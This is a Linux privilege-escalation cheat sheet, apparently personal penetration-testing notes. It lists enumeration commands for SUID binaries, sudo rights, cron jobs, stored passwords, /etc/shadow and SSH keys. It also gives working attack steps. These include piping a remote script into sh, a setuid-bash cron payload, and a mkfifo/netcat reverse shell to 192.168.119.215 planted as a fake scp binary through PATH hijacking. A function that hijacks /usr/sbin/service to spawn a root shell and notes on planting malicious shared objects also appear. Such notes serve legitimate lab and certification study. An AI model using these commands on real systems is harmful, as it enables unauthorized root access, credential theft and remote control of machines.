# Automated

**LINPEAS**\
```bash
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
linpeas -a > /dev/shm/linpeas.txt
less -r /dev/shm/linpeas.txt #Read with colors
```
**Linprivchecker**\
python linuxprivchecker.py

**Unix Privesc Check**\
./unix-privesc-check standard

**LinEnum**\
./LinEnum.sh -s -k keyword -r report -e /tmp/ -t 


# Initial
```bash
id | whoami | hostname
sudo -l
find / -writable -type d 2>/dev/null
cat /etc/*-release
lsb_release -a
hostnamectl
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
find / -perm -u=s -type f 2>/dev/null
```

# Enum Users and Groups
```bash
cat /etc/passwd | cut -d: -f1  
cat /etc/shadow
cat /etc/groups
```

# OS | Kernel | Processor
```bash
cat /etc/issue
cat /etc/*-release
uname -a
uname -r
cat /proc/version
hostnamectl | grep Kernel
cat /proc/cpuinfo
```

# Environment Variables
```bash
(env || set) 2>/dev/null
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
```

# Enumerate Running Processes and Services
```bash
ps aux
ps aux | grep "^root"
ps -ef | grep root
ss -anp

# CentOS/RHEL 7.x
systemctl list-unit-files
```

# Installed Applications
* Aptitude-based distributions (Ubuntu, Debian, etc): **dpkg -l**
* RPM-based distributions (Fedora, RHEL, etc): **rpm -qa**
* pkg*-based distributions (OpenBSD, FreeBSD, etc): **pkg_info**
* Portage-based distributions (Gentoo, etc): **equery list or eix -I**
* pacman-based distributions (Arch Linux, etc): **pacman -Q**
* Cygwin: **cygcheck --check-setup --dump-only * **
* Slackware: **slapt-get --installed**
* Others are shown below
```bash
ls -alh /usr/bin/
ls -alh /sbin/
```
Find out versions for common application
```bash
apache2 -v
sshd -V
mysql --version
```

# SUDO / SUID / SGID
Enumerating Binaries That can be run with root permission or AutoElevate (OS-sepecific shortcuts)
```bash
# SUDO
sudo -l

# SUID (chmod 4000) - run as the owner, not the user who started it.
find / -perm -u=s -type f 2>/dev/null

# SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -g=s -type f 2>/dev/null
```
Map what you found against this list --> https://gtfobins.github.io/

# Enumerate Scheduled Tasks
```bash
ls -lah /etc/cron*
cat /etc/crontab
crontab -e

echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > file

# Cron Paths
Check the PATH in cron and if you can put a malicious executable in a higher priority path

# File Overwrites
Similar to Paths but by simply overwriting a root executable we can get root (requires write access on the file)

# Wildcards
Check wildcards within root cronjobs
```

# Enumerating Network Information
```bash
route print
ip a
/sbin/route
netstat -antup # Check if the NMAP scan corresponds with this or if some ports are used locally

-a = all
-n = numeric (no translation)
-tu = TCP/UDP
-p = PID for sockets
```

# Stored Passwords / SSH / Credentials

```bash
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla

# Exclude directories from search
find -name "*.txt" -not -path "./.mozilla/*" -not -path "./.cache/*"

# Find writable files and exclude all "Permission denied" messages
find / -writable -iname "*.service" 2>&1 | grep -v "Permission denied"

# Filenames are named password
locate passwd,secret,pwd,pass,password=, | more

# Find files/directories owned by certain groups or users
find . -group {group-name} -name {file-name}
find . -user {group-name} -name {file-name}

# Check config files and DBs
cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD
cat /root/anaconda-ks.cfg
```

# Enumerating Unmounted Disks
```bash
cat /etc/fstab
mount
/bin/lsblk
```

# Shared Objects
If we have a shared object that has the SUID set we can inspect it with strace and search for interaction with other files  
```bash
strace /usr/local/bin/myshareobject.so 2>&1 | grep -i -E "open|access|no such file"
```
Check if there is a shared-object within the .so that does not exist. If so we can create our own (check ~/Documents/helper_scripts/libcalc.c) and compile it there
```bash
gcc -shared -fPIC -o /home/user/.config/missing.so /home/user/libcalc.c
```

# SSH / Authorized keys
```bash
find / -iname id_rsa 2> /dev/null
find / -iname authorized_keys 2> /dev/nul
Use it ssh -i privatekey root@192.168.1.1  
```

# Log Analysis
To perform a simple search, enter your search string followed by the file you want to search. Here, we search the authentication log for lines containing “user testuser”.  
```bash
$ grep "user testuser" /var/log/auth.log
```

This is a regex that only returns instances of 4792 preceded by “port” and an empty space. This can be handy when filtering ports
```bash
$ grep -P "(?<=port\s)4792" /var/log/auth.log
```

## Surround Search
The -B flag specifies how many lines to return before the event, and the -A flag specifies the number of lines after.
grep -B 3 -A 2 'testuser' /var/log/auth.log

## Cut
The cut command allows you to parse fields from delimited logs. Delimiters are characters like equal signs or commas that break up fields or key-value pairs.  
Let’s say we want to parse the user from this log:  

pam_unix(su:auth): authentication failure; logname=testuser uid=1000 euid=0 tty=/dev/pts/0 ruser=hoover rhost=  user=root  

We can use the cut command like this to get the eighth match. It will be the character after the eight "=" sign.  
```bash
$ grep "authentication failure" /var/log/auth.log | cut -d '=' -f 8
root
```

## Awk
Awk is a powerful command line tool that provides a complete scripting language. For example, let’s say we want to extract the username from all failed login attempts. Our logs have the following format.  

Mar 24 08:28:18 ip-172-31-11-241 sshd[32701]: input_userauth_request: invalid user guest [preauth]  

Here’s how you can use the awk command. First, we use the regular expression /sshd.*invalid user/ to match the sshd invalid user lines. Then print the ninth field using the default delimiter (a space character) using { print $9 }. This outputs the usernames.  

```bash
$ awk '/sshd.*invalid user/ { print $9 }' /var/log/auth.log  
guest
```

# Enumerate Firewall
```bash
Check /etc/iptables
Check if the user used iptables-save
```

# Privilege Escalation using PATH variable
If we find custom/uncommon SUID we can check them out with strings. If there is a path we can modify the $PATH and make our own malicious executable be executed instead of the legit one.

https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/
Since uploadtosecure uses SCP we can create our own SCP application and echo a reverse shell into that

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.215 8083 >/tmp/f" > /tmp/scp
chmod 777 /tmp/scp
```
Then we add tmp to the path before the others
```bash
export PATH=/tmp:$PATH
```
That way our fake SCP will be executed instead of the real one. Since uploadtoseecure has root privs the reverse shell will run as root.
If the path is absolute e.g /usr/sbin/service apache2 start we can create a malicious function and export it
function /usr/sbin/service() {cp /bin/bash/ /tmp && chmod +s /tmp/bash && /tmp/bash -p;}
```bash
export -f /usr/sbin/service
```
